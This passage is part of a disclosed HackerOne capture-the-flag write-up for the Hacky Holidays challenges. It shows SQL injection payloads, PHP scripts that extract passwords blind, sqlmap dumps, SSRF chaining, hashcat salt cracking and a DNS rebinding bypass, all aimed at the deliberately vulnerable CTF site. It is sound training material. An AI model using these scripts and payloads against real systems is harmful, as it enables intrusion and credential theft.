as name we put in step1\n\nafter playing a bit around that workflow, found that there's a blind second order SQLi in name input from step1 and the result is in step3\n\n- name `aaa'or'1'='1` we get `There is 494202 other player(s) with the same name as you!` \n- name `aaa'or'1'='2` we get `There is 8 other player(s) with the same name as you!` \n\nfair enough, since its blind sqli i tried to guess some tables,columns to reduce the number of requests and luckily it was easy to guess\n\nsince we have a login page that says it's only for admin, my guess was that table could be admin\n- name `admin' and ((select 1 from admin limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`\n- name `admin' and ((select 1 from blablacolumn limit 0,1)=1)-- -` returns `There is 0 other player(s) with the same name as you!`\nlooks like admin is a correct table name\n\nnow to guess columns for table admin\n- name `admin' and ((select 1 from information_schema.columns where table_name='admin' and column_name='username' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`\n- name `admin' and ((select 1 from information_schema.columns where table_name='admin' and column_name='password' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`\n\nso table admin with username and password columns, \n\n- name `admin' and ((select 1 from admin where username='admin' limit 0,1)=1)-- -` returns `There is 67 other player(s) with the same name as you!`\nfirst record in table admin has username='admin' :)\n\nonly his password to fetch now, this cannot be guessed and will be painful manually\nso i did the following script to automate the extraction, it's not perfect but it does the job,\nwe can use same session to go through setting a name and fetching score page, we only have to fill the quiz manually first time manually and we use that session inside this solver\n\n* made the comparaison with hex value to avoid case insensitivity \n\n```PHP\n\u003c?php\n$str = \"\";\nfor($j=1;$j\u003c20;$j++){\n    for($i=32;$i\u003c128;$i++){\n        $abc = \"(select%20hex(substr(password,\".$j.\",1))%20from%20admin%20limit%200,1)=%27\".dechex($i).\"%27\";\n        if(dosql($abc)=='There is 1 other player(s) with the same name as you!'){\n            $str .=chr($i);\n            echo $str.\"\\n\";\n            break;\n        }\n    }\n}\nfunction dosql($str){\n    get_url(\"https://hackyholidays.h1ctf.com/evil-quiz\",\"session=6abf0c2ba645d92e07859120434031a5\",\"name=-2223232323'union select 1,2,3,4 from information_schema.tables WHERE \".$str.\"-- -\");\n    $kk= get_url(\"https://hackyholidays.h1ctf.com/evil-quiz/score\",\"session=6abf0c2ba645d92e07859120434031a5\")['html'];\n    preg_match(\"/\u003cdiv style=\\\"margin-top\\:20px\\\"\u003e(.*?)\u003c\\/div\u003e/\", $kk,$ma);\n    return @$ma[1];\n}\nfunction get_url($url,$cookie=\"\",$post=\"\") {\n    $curl = curl_init();\n    curl_setopt($curl, CURLOPT_URL, $url);\n    if( !empty($post) ) {\n        curl_setopt($curl, CURLOPT_POST, 1);\n        curl_setopt($curl, CURLOPT_POSTFIELDS, $post);\n    }\n    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);\n    curl_setopt($curl, CURLOPT_COOKIE, $cookie);\n    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\n    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);\n    curl_setopt($curl, CURLOPT_TIMEOUT,60);\n    $html = curl_exec($curl);\n    $info = curl_getinfo($curl);\n    $error = '';\n    if( $html === false ) {\n        $error = 'Curl error: ' . curl_error($curl);\n    }               \n    curl_close($curl);\n    $arr = array();\n    $arr['html'] = $html;\n    $arr['info'] = $info;\n    $arr['error'] = $error;\n    return $arr;    \n}\n```\n\n\n```\t\n\t$ php sqli.php\n\tS\n\tS3\n\tS3c\n\tS3cr\n\tS3cre\n\tS3creT\n\tS3creT_\n\tS3creT_p\n\tS3creT_p4\n\tS3creT_p4s\n\tS3creT_p4ss\n\tS3creT_p4ssw\n\tS3creT_p4ssw0\n\tS3creT_p4ssw0r\n\tS3creT_p4ssw0rd\n\tS3creT_p4ssw0rd-\n\tS3creT_p4ssw0rd-$\n```\n\nwe now login with `admin:S3creT_p4ssw0rd-$` it and flag is printed flag{6e8a2df4-5b14-400f-a85a-08a260b59135}\n\n\n----------------------------------------------------------------\n\n## Day 10\n\n\nDay10's challenge is signup-manager located at https://hackyholidays.h1ctf.com/signup-manager/\nmain page html source code has in first line reference to README.md file `\u003c!-- See README.md for assistance --\u003e`\nwe could download it from https://hackyholidays.h1ctf.com/signup-manager/README.md\n\nit has all the explaination and files :?, needed to complate this challenge\n```\n# SignUp Manager\n\nSignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\n### How to Install\n\n1) Create a directory that you wish SignUp Manager to be installed into\n2) Move signupmanager.zip into the new directory and unzip it.\n3) For security move users.txt into a directory that cannot be read from website visitors\n4) Update index.php with the location of your users.txt file\n5) Edit the user and admin php files to display your hidden content\n6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n7) Default login is admin / password\n```\n\nbased on the install instructions, i looked up the file `signupmanager.zip` and it's still there and it has the app source code\ni looked up `users.txt` file, but it was changed \n\nall the magic is happening in index.php file, the rest of files and used more/less as a templates files and cannot be called directly because of line `if( !isset($page) ) die(\"You cannot access this page directly\"); ?\u003e`\n\nbased on instruction 6 from README.md, each user record in the txt db is in a line, and if that line ends with Y, we're admin\n\nwhen pressing signup button `$cookie = addUser($username, $password, $age, $firstname, $lastname);` is executed after passing several checks\n\n```\nfunction addUser($username,$password,$age,$firstname,$lastname){\n    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date(\"U\").microtime().rand() );\n    $line = '';\n    $line .= str_pad( $username,15,\"#\");\n    $line .= $password;\n    $line .= $random_hash;\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n    $line .= 'N';\n    $line = substr($line,0,113);\n    echo $line;\n    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);\n    return $random_hash;\n}\n```\n\nthe final result will always be truncated to 113bytes+newline, each element of the final row is padded to it's hardcoded length\nthe checks are pretty strict\n\n```\n\n            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"username\"]), 0, 15);\n            if (strlen($username) \u003c 3) {\n                $errors[] = 'Username must by at least 3 characters';\n            } else {\n                if (isset($all_users[$username])) {\n                    $errors[] = 'Username already exists';\n                }\n            }\n            $password = md5($_POST[\"password\"]);\n            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"firstname\"]), 0, 15);\n            if (strlen($firstname) \u003c 3) {\n                $errors[] = 'First name must by at least 3 characters';\n            }\n            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"lastname\"]), 0, 15);\n            if (strlen($lastname) \u003c 3) {\n                $errors[] = 'Last name must by at least 3 characters';\n            }\n            if (!is_numeric($_POST[\"age\"])) {\n                $errors[] = 'Age entered is invalid';\n            }\n            if (strlen($_POST[\"age\"]) \u003e 3) {\n                $errors[] = 'Age entered is too long';\n            }\n            $age = intval($_POST[\"age\"]);\n```\nall elements length are checked exactly before sending them to `addUser()` function except for age which is affected strval right after the length check, but php is funny, `$_GET['age']` when sent to strval it will be evaluated as an int, we can use floats and exponential\n\n```\n$ php -a\nInteractive mode enabled\n\nphp \u003e echo str_pad('30',3,'#');\n30#\nphp \u003e echo str_pad('300000000000000000',3,'#');\n300000000000000000\nphp \u003e echo str_pad(3e9,3,'#');\n3000000000\n```\n\nthus, age variable can push the ones coming after it `firstname` and `lastname` and we can have Y appended at the end of the string\n```\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n```\n\n```\n$ curl https://hackyholidays.h1ctf.com/signup-manager/ -d 'action=signup\u0026username=ooooooooooooooo\u0026password=password\u0026age=3e9\u0026firstname=YYYYYYYYYYYYYYYYYY\u0026lastname=YYYYYYYYYYYYYYYYYY' -vv\n[...]\n\u003e POST /signup-manager/ HTTP/1.1\n\u003e Host: hackyholidays.h1ctf.com\n\u003e User-Agent: curl/7.58.0\n\u003e Accept: */*\n\u003e Content-Length: 117\n\u003e Content-Type: application/x-www-form-urlencoded\n\u003e \n[...]\n\u003c HTTP/1.1 302 Found\n\u003c Server: nginx/1.18.0 (Ubuntu)\n\u003c Date: Wed, 23 Dec 2020 01:48:36 GMT\n\u003c Content-Type: text/html; charset=UTF-8\n\u003c Transfer-Encoding: chunked\n\u003c Connection: keep-alive\n\u003c Set-Cookie: token=c66cbe646e0e05df1ba8b04b492f6f84; \n\u003c Location: /signup-manager/\n\u003c \n\n$ curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=c66cbe646e0e05df1ba8b04b492f6f84'\n[...]\n\u003cp class=\"text-center\"\u003eflag{99309f0f-1752-44a5-af1e-a03e4150757d}\u003c/p\u003e\n\u003cp class=\"text-center\"\u003eYou made it through, continue to your next task \u003ca href=\"/r3c0n_server_4fdk59\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n[...]\n```\nwe got a flag, and next challenge will be at: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59\t\n\n\n\n----------------------------------------------------------------\n\n## Day 11\n\n\nDay11 starts from url we got the end of day10 which is https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, this challenge was pretty fun, collecting different pieces together to obtain a flag\n\nthere's some photo albums, and a message saying there's an api under developement\n\n### Key 1\n\nregarding the api its at https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api, there's given a documentation about the api response codes\n```\nHTTP Status Code  Explanation\n200 Successful request with data returned\n204 Successful request but with no data found\n404 Invalid Endpoint\n400 Invalid GET/POST variable\n401 Unauthenticated Request or Invalid client IP\n```\nby trying to enumerate any endpoint from our ip we have 401 response code, probably internal API, so we might need an ssrf to query this api\n```\n$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/lol\n{\"error\":\"This endpoint cannot be visited from this IP address\"}\n```\n\n### Key 2\n\nwhen browsing to any album ex:https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k\nthe pictures in page source are coming from some handler not direct image url\n```\n\u003cimg class=\"img-responsive\" src=\"/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9\"\u003e\n```\npointing to `/r3c0n_server_4fdk59/picture?data=[BASE64_JSON_DATA]`\n\n```\n$ printf eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9|base64 -d\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/db507bdb186d33a719eb045603020cec.jpg\",\"auth\":\"bbf295d686bd2af346fcd80c5398de9a\"}\n```\nif we try to call those images directly we're not allowed apparently\n\n```\n$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg\nImage cannot be viewed directly\n```\n\nif we try to tamper with the image path we get another error message\n\n```\n$ curl https://hackyholidays.h1ctf.comta=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2UyLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9\ninvalid authentication hash\n```\n\nso the auth field, is serving as a signature, i tried to guess what it is by brutercing salt with the path but no luck.\n\n### Key 3\n\nthe album endpoint is vulnerable to a blind SQLi \n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27and%201=1--%20-                              =\u003e  TRUE  (image list returned)\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27and%201=2--%20-                              =\u003e  FALSE (404 page)\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27order%20by%203--%20-                         =\u003e  TRUE\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%201,2,3%20limit%200,1--%20-   =\u003e  TRUE, 3 printed instead of album name\n```\n\nunion based mysql injection, then i went to dump the whole db with sqlmap\n\n```\n$ python sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbms=mysql --technique=U --threads=10 -D recon --dump-all\n[...]\n[...]\n[...]\nDatabase: recon\nTable: album\n[3 entries]\n+----+--------+-----------+\n| id | hash   | name      |\n+----+--------+-----------+\n| 1  | 3dir42 | Xmas 2018 |\n| 2  | 59grop | Xmas 2019 |\n| 3  | jdh34k | Xmas 2020 |\n+----+--------+-----------+\n[...]\n[...]\n[...]\nDatabase: recon\nTable: photo\n[6 entries]\n+----+----------+--------------------------------------+\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |\n| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |\n| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n+----+----------+--------------------------------------+\n```\n\nwe have 2 tables with no interesting content, no auth hashes in the db, so this means they are probably generated after fetching data from query\n\ni had doubt that there's 2 different queries executed in the backend instead of using some join for both tables in a single query\nto clear my doubt i wanted to check what was the current query that is executed while we are injecting our payload,\nluckily enough, mysql keep running processes in a table, read more about it here https://www.devart.com/dbforge/mysql/studio/show-running-queries-in-processlist.html\nso let's do `SELECT INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE db ='recon' limit 0,1`, again i used sqlmap \n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%201,2,INFO%20from%20information_schema.processlist%20where%20db=%27recon%27%20limit%200,1--%20-\n\nselect * from album where hash = '-jdh34k'union select 1,2,INFO from information_schema.processlist where db='recon' limit 0,1-- -\n```\nso the query is `select * from album where hash='[OUR_INPUT]'`\nnow, i can only assume that result of this query either id or name is passed to a second query that selects from photo table\n\n### sqli inside an sqli to SSRF\n\nbased on assumption from `Key 3`, we potentially have a second order sql injection, we already know query selecting * from album which has 3 columns\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%201,2,3--%20-                            =\u003e FALSE\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k%27union%20select%20*%20from%20album%20limit%200,1--%20-   =\u003e TRUE\n```\nthis means first query should return valid row that goes with second query somewhere\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%201,2,3%20limit%200,1--%20-\n```\nthis returns photos from album with id 1, so second query is taking 1st column result inside union to the second query, let's do another sqli inside 1st column\n```\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%20(select%20%22%27%20union%20select%20%27a%27,%27b%27,%27c%27--%20-%22),2,3%20as%20id%20limit%200,1--%20-\n```\npage returned with invalid image, \n```\n$ printf eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2EiLCJhdXRoIjoiZWU1YjY2Y2E2YmMyNGMyNTI3NjZlZjZlNzhjZWQ2MGYifQ==|base64 -d\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/c\",\"auth\":\"ee5b66ca6bc24c252766ef6e78ced60f\"}\n```\nthe generated json has changed ;), and has valid signature\n```\n$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/pictuta=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2MiLCJhdXRoIjoiNTBlNGI3NTg2ZTRlMGU4MzhiOWYzNzNjYTdmYzZjMzMifQ== \nExpected HTTP status 200, Received: 404\n```\nthe response makes sense since that url doesnt exist, we didnt get page body though!\nwe finally got the SSRF.\n\n\n### Enumerating the api\n\nnow that we have an ssrf let's fetch the api, \n```\n$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-jdh34k%27union%20select%20(select%20%22%27%20union%20select%20%27a%27,%27b%27,%27../api/%27--%20-%22),2,3%20as%20id%20limit%200,1--%20-\n[...]\n\u003cimg class=\"img-responsive\" src=\"/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9\"\u003e\n[...]\n\n$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9\nInvalid content type detected\n```\nvery odd message, based on this and the very previous request to `/api/c`, we only have response codes, and if response code is 200, message is `Invalid content type detected`, looks like a good oracle to exfiltrate data semi blindly\n\nwe can enumerate the api endpoints, based on response codes with help from api documentation, i made a small php script to do that\n```\n$ cat brute1.php\n\u003c?php\n$a = file_get_contents(\"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20%22%27%20union%20select%201,2,%27../api/\".$argv[1].\"%27--%20-%22)%20as%20id,1,1%20from%20album%20limit%200,1--%20-\");\npreg_match(\"/\u003cimg class=\\\"img\\-responsive\\\" src=\\\"(.*?)\\\"\u003e/\", $a,$ma);\n$b= file_get_contents(\"https://hackyholidays.h1ctf.com\".$ma[1]);\nif (!preg_match(\"/Received\\: 404/\", $b)) echo $argv[1].\"\\n\";\n\n$ for i in $(cat ./wordlist.txt); do php brute1.php $i; done\nuser\nping\nbenchmark\nsleep\n```\n\nenumerating the parameters for user endpoint (there was not much in the other ones)\n```\n$ cat brute2.php\n\u003c?php\n$a = file_get_contents(\"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20%22%27%20union%20select%201,2,%27../api/user?\".$argv[1].\"%27--%20-%22)%20as%20id,1,1%20from%20album%20limit%200,1--%20-\");\npreg_match(\"/\u003cimg class=\\\"img\\-responsive\\\" src=\\\"(.*?)\\\"\u003e/\", $a,$ma);\n$b= file_get_contents(\"https://hackyholidays.h1ctf.com\".$ma[1]);\nif (!preg_match(\"/Received\\: 400/\", $b)) echo $argv[1].\"\\n\";\n\n$ for i in $(cat ./wordlist.txt); do php brute2.php $i; done\nusername\npassword\n0\n```\n\nok, now we have `user` endpoint with parameters `username` and `password`\n\n### Extracting username and password\n\nthe api `/user` when supplying any random username or password value it returns error 202 which means `Successful request but with no data found`, so its kind of checking on the username or password supplied with some database in the backend for the api.\nafter some trial and error i found out that when providing `%` as username returns status 200, so it serves as a wildcard, probably another mysql as dbms and search and matching with `LIKE` statement\nnow it's just matter of bruteforcing the username and password by char, `LIKE` in mysql is case insensitive, hopefully this doesnt ruin the extracted user and pass :)\nagain a small php shizzle to do the job\n```\n$ cat b.php\n\u003c?php\n$str=\"\";\nfor($j=0;$j\u003c128;$j++){\n  echo \"pos: \".$j.\"\\n\";\n  for($i=30;$i\u003c128;$i++){\n    if(!in_array(chr($i), array('%','#','\"',\"'\")) ){\n      $a = file_get_contents(\"https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-3dir42%27%20union%20select%20(select%20\\\"%27%20union%20select%201,2,%27../api/user?\".$argv[1].\"=\".urlencode($str.chr($i)).\"%25%27--%20-\\\")%20as%20id,1,1%20from%20album%20limit%200,1--%20-\");\n      preg_match(\"/\u003cimg class=\\\"img\\-responsive\\\" src=\\\"(.*?)\\\"\u003e/\", $a,$ma);\n      $lol= @file_get_contents(\"https://hackyholidays.h1ctf.com\".$ma[1]);\n      if($lol=='Invalid content type detected'){\n        $str .= chr($i);\n        echo $str.\"\\n\";\n        break;\n      }\n    }\n  }\n}\n\n$ php b.php username\npos: 0\nG\npos: 1\nGR\npos: 2\nGRI\npos: 3\nGRIN\npos: 4\nGRINC\npos: 5\nGRINCH\npos: 6\nGRINCHA\npos: 7\nGRINCHAD\npos: 8\nGRINCHADM\npos: 9\nGRINCHADMI\npos: 10\nGRINCHADMIN\npos: 11\npos: 12\n^C\n\n$ php b.php password\npos: 0\nS\npos: 1\nS4\npos: 2\nS4N\npos: 3\nS4NT\npos: 4\nS4NT4\npos: 5\nS4NT4S\npos: 6\nS4NT4SU\npos: 7\nS4NT4SUC\npos: 8\nS4NT4SUCK\npos: 9\nS4NT4SUCKS\npos: 10\npos: 11\npos: 12\n^C\n\n```\n\ncreds extracted are `GRINCHADMIN:S4NT4SUCKS`\n\n### Getting the flag\n\nback to attack box login interface now, https://hackyholidays.h1ctf.com/attack-box\nsince like in mysql is case insensitive first attempt with `GRINCHADMIN:S4NT4SUCKS` failed\nluckily no guessing mojo involved turned it all to lowercase and it went through\n\n```\nCome back tomorrow\nflag{07a03135-9778-4dee-a83c-7ec330728e72}\n```\nattack-box should be last day challenge starting point.\n\n----------------------------------------------------------------\n\n## Day 12\n\nhere's the flag for it,  flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\nwriteup following in the next comment\n\n## Impact\n\ndox the grinch","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-11T22:46:38.841Z","allow_singular_disclosure_after":-20874861.847859316,"singular_disclosure_allowed":true,"vote_count":3,"voters":["e4366eolywrgpidfbio","1337fenrir","deltasyntax"],"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10192464,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Very impressive and congrats for being the first to solve this! ","automated_response":false,"created_at":"2020-12-23T20:27:15.825Z","updated_at":"2020-12-23T20:27:15.825Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10192599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks! \nhere's the followup on Day12\n\n----------------------------------------------------------------\n\n## Day 12\n\nwe resume where day11 ended https://hackyholidays.h1ctf.com/attack-box\nwe have an interface to launch a ddos attack, the IPs are already set\nthe launch payload is some base64 json data\n```\nprintf eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==|base64 -d\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n```\n\nagain an md5 signature, md5(ip)!=signature, \nif we tamper the target or the hash we get an error message\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==\n\n```\nInvalid Protection Hash\n```\nlength extension attack won't work because of nullbytes and it's not accepting anything except [a-zA-Z0-9.-]\nafter scratching my head around, went to try if that signature is salted with something, i turned on hashcat with rockyou wordlist\n```\n$ cat test.txt\n5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213\n\n$ ./hashcat.bin -m 20 ./test.txt ./rockyou.txt --force\n[...]\n[...]\nStopped: Wed Dec 23 21:35:50 2020\n\n\n$ ./hashcat.bin -m 20 ./test.txt ./rockyou.txt --force --show\n5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463\n\n```\n\nok then we have the salt, we can now forge any signature for any ip, the goal of the CTF is to take down the grinch, so let's launch an attack against the ddos server itself `127.0.0.1`\n\n```\n$ printf mrgrinch463127.0.0.1|md5sum\n3e3f8df1658372edf0214e202acb460b  -\n\n$ printf '{\"target\":\"127.0.0.1\",\"hash\":\"3e3f8df1658372edf0214e202acb460b\"}'|base64\neyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==\n\n$ curl -v https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ== -H 'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687'\n[...]\n\u003e GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ== HTTP/1.1\n\u003e Host: hackyholidays.h1ctf.com\n\u003e User-Agent: curl/7.58.0\n\u003e Accept: */*\n\u003e Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687\n\u003e \n[...]\n\u003c HTTP/1.1 302 Found\n\u003c Server: nginx/1.18.0 (Ubuntu)\n\u003c Date: Wed, 23 Dec 2020 20:43:40 GMT\n\u003c Content-Type: text/html; charset=UTF-8\n\u003c Transfer-Encoding: chunked\n\u003c Connection: keep-alive\n\u003c Location: /attack-box/launch/67f103dbcfbdf923a1b89bac2b10e195\n\n$ curl https://hackyholidays.h1ctf.com/attack-box/launch/67f103dbcfbdf923a1b89bac2b10e195.json -H 'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687'\n[{\"id\":\"2085\",\"content\":\"Setting Target Information\",\"goto\":false},{\"id\":\"2088\",\"content\":\"Getting Host Information for: 127.0.0.1\",\"goto\":false},{\"id\":\"2089\",\"content\":\"Local target detected, aborting attack\",\"goto\":false}]\n```\n\nthe grinch has blacklisted 127.0.0.1, so he's what i assumed is happening\n1- resolving the ip for the host\n2- check the ip against a blacklist\n3- decide to attack or not\n\ni used dns rebinding attack, i setup a host that resolves to one of santa boxes onces then to 127.0.0.1\n\n```\n$ host truncated.host\ntruncated.host has address 203.0.113.33\n$ host truncated.host\ntruncated.host has address 127.0.0.1\n```\n\nlaunching the attack now with our host for this, with similar steps from earlier, here's the output \n\n```\n[{\"id\":\"1608\",\"content\":\"Setting Target Information\",\"goto\":false},{\"id\":\"1610\",\"content\":\"Getting Host Information for: truncated.host\",\"goto\":false},{\"id\":\"1611\",\"content\":\"Host resolves to 203.0.113.33\",\"goto\":false},{\"id\":\"1612\",\"content\":\"Spinning up botnet\",\"goto\":false},{\"id\":\"1614\",\"content\":\"Launching attack against: truncated.host \\/ 127.0.0.1\",\"goto\":false},{\"id\":\"1615\",\"content\":\"No Response from attack server, retrying...\",\"goto\":false},{\"id\":\"1616\",\"content\":\"No Response from attack server, retrying...\",\"goto\":false},{\"id\":\"1617\",\"content\":\"No Response from attack server, retrying...\",\"goto\":\"\\/attack-box\\/challenge-completed-a3c589ba2709\"}]\n```\n\nbingo, the attack was successfull against the grinch server, and for once goto is not set to false :)\nbrowsing to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709, \nand the flag pops up with a message indicating the attack was stoped!\n\nF1127663\n","automated_response":false,"created_at":"2020-12-23T20:55:27.558Z","updated_at":"2020-12-23T20:58:51.323Z","actor":{"username":"rekter0","cleared":false,"url":"/rekter0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pwypd9b4i37WWTYyGRpT3Ubo/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":1127663,"filename":"Screenshot_2020-12-23_21-53-00.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8vt4wssdmc7sy5vexulo0zk0b8ii?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-12-23_21-53-00.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-12-23_21-53-00.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTORFIYD3%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132100Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQChDyd%2F8sderDumCKy4K95v58gBkSuqLwNtIleN1xjZhQIhAKZxfy3eSfpyS6PIWiFtxLNwEVKc%2Bz8qwZ4MCezaRdPrKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgySnkTLPEDdaesP8rEq1wMU5H7XSjeJCsvn3XVvaPCaJRDoeLO6t0c2IKj%2FQ703TPObPBm%2BLJVGthlv9acwKupZXDDEbz1n%2FDHHRfAatjxEDBYMJTgTSFu4xbJ22ugtllkxFq4vdlgsiWctV